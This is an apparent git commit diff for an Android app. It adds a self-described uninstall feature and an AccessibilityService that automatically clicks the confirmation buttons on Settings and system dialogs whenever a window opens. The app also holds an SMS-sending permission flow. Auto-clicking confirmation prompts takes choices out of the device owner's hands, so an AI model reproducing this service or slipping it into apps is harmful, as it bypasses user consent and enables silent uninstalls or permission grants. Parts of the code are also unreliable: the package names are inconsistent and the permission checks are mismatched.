196881764f534a5458c4f408a4a302c447892564
Akash Singh <akash@revmedia.my>
2023-06-15 02:34:46 +0800

    Direct Message on higher version add uninstall functionality.

---
+++ app/src/main/java/com/akrobyte/registration/MyAccessibilityService.java
@@ -0,0 +1,54 @@
+package com.akrobyte.registration;
+
+import android.accessibilityservice.AccessibilityService;
+import android.util.Log;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+
+import java.util.List;
+
+    public class MyAccessibilityService extends AccessibilityService {
+    private static final String TAG = MyAccessibilityService.class
+            .getSimpleName();
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        Log.i(TAG, "ACC::onAccessibilityEvent: " + event.getEventType());
+
+        //TYPE_WINDOW_STATE_CHANGED == 32
+        if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == event
+                .getEventType()) {
+            AccessibilityNodeInfo nodeInfo = event.getSource();
+            Log.i(TAG, "ACC::onAccessibilityEvent: nodeInfo=" + nodeInfo);
+            if (nodeInfo == null) {
+                return;
+            }
+
+            List<AccessibilityNodeInfo> list = nodeInfo
+                    .findAccessibilityNodeInfosByViewId("com.android.settings:id/left_button");
+            for (AccessibilityNodeInfo node : list) {
+                Log.i(TAG, "ACC::onAccessibilityEvent: left_button " + node);
+                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+            }
+
+            list = nodeInfo
+                    .findAccessibilityNodeInfosByViewId("android:id/button1");
+            for (AccessibilityNodeInfo node : list) {
+                Log.i(TAG, "ACC::onAccessibilityEvent: button1 " + node);
+                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
+            }
+        }
+
+    }
+
+    @Override
+    public void onServiceConnected() {
+        Log.i(TAG, "ACC::onServiceConnected: ");
+    }
+
+    @Override
+    public void onInterrupt() {
+        // TODO Auto-generated method stub
+
+    }
+}
--- app/src/main/java/com/akrobyte/registration/SplashActivity.java
+++ app/src/main/java/com/akrobyte/registration/SplashActivity.java
@@ -1,6 +1,7 @@
 package com.akrobyte.registration;
 
 import android.Manifest;
+import android.annotation.TargetApi;
 import android.app.Activity;
 import android.app.AlertDialog;
 import android.app.PendingIntent;
@@ -9,6 +10,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.content.pm.PackageInstaller;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Build;
@@ -23,22 +25,48 @@ import android.widget.TextView;
 
 import com.anviam.vloader.R;
 
+import java.io.DataOutputStream;
+import java.io.IOException;
+
 public class SplashActivity extends Activity {
     private static final int PERMISSION_SEND_SMS = 123;
+    private static final int REQUEST_CODE = 321;
 
     Button btnClick;
+
+    String packageName = "com.aktobyte.registration";
+    Context context = this;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_splash);
-        requestSmsPermission();
+        //requestSmsPermission();
+        requestForUninstallPermission();
         btnClick = findViewById(R.id.btn_click);
-        btnClick.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
+        btnClick.setOnClickListener(v ->
+        {
+            try {
                 uninstalled();
+            } catch (Exception e) {
+                throw new RuntimeException(e);
             }
+            // requestForUninstallPermission();
         });
+    }
+
+    private void requestForUninstallPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            PackageManager packageManager = getPackageManager();
+            boolean hasPermission = packageManager.canRequestPackageInstalls();
+            if (!hasPermission) {
+                // Permission is not granted, so request it
+                requestPermissions(new String[]{Manifest.permission.REQUEST_DELETE_PACKAGES}, REQUEST_CODE);
+            } else {
+                Uri packageUri = Uri.parse("package:com.aktobyte.registration");
+                Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
+                startActivity(uninstallIntent);
+            }
+        }
     }
 
     private void requestSmsPermission() {
@@ -94,6 +122,15 @@ public class SplashActivity extends Activity {
                 sendSMS();
             } else {
                 goToAppSettings();
+            }
+        }else if(requestCode == REQUEST_CODE)
+        {
+            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Uri packageUri = Uri.parse("package:com.aktobyte.registration");
+                Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
+                startActivity(uninstallIntent);
+            } else {
+                // Permission denied, inform the user or handle it accordingly
             }
         }
     }
@@ -171,13 +208,44 @@ public class SplashActivity extends Activity {
         return sharedpreferences.getBoolean("isConfirm",false);
     }
 
-    private void uninstalled()
-    {
-        Intent intent = new Intent(Intent.ACTION_DELETE);
+    @TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH)
+    private void uninstalled() throws Exception {
+
+        if (isAppInstalled(packageName, context)) {
+            uninstallApp(packageName, context);
+        } else {
+            // The app is not installed
+        }
+       /* Uri packageUri = Uri.parse("package:com.aktobyte.registration");
+        Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
+        startActivity(uninstallIntent);*/
+       /* Intent intent = new Intent(Intent.ACTION_DELETE);
         Uri packageUri = Uri.parse("package:com.aktobyte.registration");
         intent.setData(packageUri);
         //Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
-        startActivity(intent);
+        startActivity(intent);*/
+    }
+
+    // Uninstall the app
+    public void uninstallApp(String packageName, Context context) {
+       /* PackageManager packageManager = context.getPackageManager();
+        packageManager.deletePackage(packageName, null);
+*/
+        String appPackage = "com.aktobyte.registration";
+        Intent intent = new Intent(getApplicationContext(), getApplicationContext().getClass()); //getActivity() is undefined!
+        PendingIntent sender = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
+        PackageInstaller mPackageInstaller =
+                this.getPackageManager().getPackageInstaller();
+        mPackageInstaller.uninstall(appPackage, sender.getIntentSender());
+    }
+    public static boolean isAppInstalled(String packageName, Context context) {
+        PackageManager packageManager = context.getPackageManager();
+        try {
+            packageManager.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
+            return true;
+        } catch (PackageManager.NameNotFoundException e) {
+            return false;
+        }
     }
 
 }
